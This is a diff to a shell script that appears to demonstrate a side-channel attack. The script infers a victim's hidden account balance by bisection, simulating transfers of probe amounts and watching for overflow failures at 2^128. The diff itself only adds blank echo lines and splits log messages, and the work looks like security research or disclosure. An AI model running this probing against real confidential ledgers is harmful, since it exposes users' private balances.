@@ -133,7 +133,7 @@ low=0
 high=$(bc <<< "2^128 - 1")
 cnt=0
 
-
+echo
 teebox info-panel "Through a bisection search, we simulate transactions that transfer a probe amount [bold yellow]P[/] from the attacker's account to the victim's account. A transaction succeeds if the victim's balance [bold yellow]B[/] < 2^128 - [bold yellow]P[/], and fails otherwise." --title "Probing Victim's Balance"
 
 teebox enter-prompt "Press [ Enter :leftwards_arrow_with_hook: ] to start probing victim's balance ..."
@@ -141,6 +141,7 @@ teebox enter-prompt "Press [ Enter :leftwards_arrow_with_hook: ] to start probin
 while [[ "$(bc <<< "${high} - ${low}")" -ne 0 ]]; do
 #while [ $(echo $(python -c "print ${high}-${low}")) != "0" ]; do
     probe=$(bc <<< "(${high} + ${low} + 1) / 2" )
+    echo
     teebox log "iteration=${cnt}"
     teebox log "low=${low}"
     teebox log "high=${high}"
@@ -158,12 +159,14 @@ while [[ "$(bc <<< "${high} - ${low}")" -ne 0 ]]; do
     # Assumes exit code 0, meaning successful, and exit code 1, meaning failure (overflow)
     if [ ${simulate_tx_result} != 0 ]; then
         high=$(bc <<< "${probe} - 1");
-        teebox log "Transaction simulation [red]failed[/], [bold yellow]probe[/] is too high ([bold yellow]probe[/] + [bold yellow]B[/] >= 2^128), decrease next [bold yellow]probe[/] amount by setting [bold]high[/]=([bold][yellow]probe[/]-1)=${high}[/]"
+        teebox log "Transaction simulation [red]failed[/], [bold yellow]probe[/] is too high ([bold yellow]probe[/] + [bold yellow]B[/] >= 2^128)"
+        teebox log "Decrease next [bold yellow]probe[/] amount by setting [bold]high[/]=([bold][yellow]probe[/]-1)=${high}[/]"
         balance_floor=$(bc <<< "2^128 - ${probe}")
         teebox log "Balance [bold yellow]B[/] >= ${balance_floor}"
     else
         low=${probe};
-        teebox log "Transaction simulation [green]succeeded[/], [bold yellow]probe[/] is low enough ([bold yellow]probe[/] + [bold yellow]B[/] < 2^128), increase next [bold yellow]probe[/] amount by setting [bold]low[/]=([bold][yellow]probe[/])=${probe}[/]"
+        teebox log "Transaction simulation [green]succeeded[/], [bold yellow]probe[/] is low enough ([bold yellow]probe[/] + [bold yellow]B[/] < 2^128)"
+        teebox log "Increase next [bold yellow]probe[/] amount by setting [bold]low[/]=([bold][yellow]probe[/])=${probe}[/]"
         balance_ceiling=$(bc <<< "2^128 - ${probe}")
         teebox log "Balance [bold yellow]B[/] < ${balance_ceiling}"
     fi
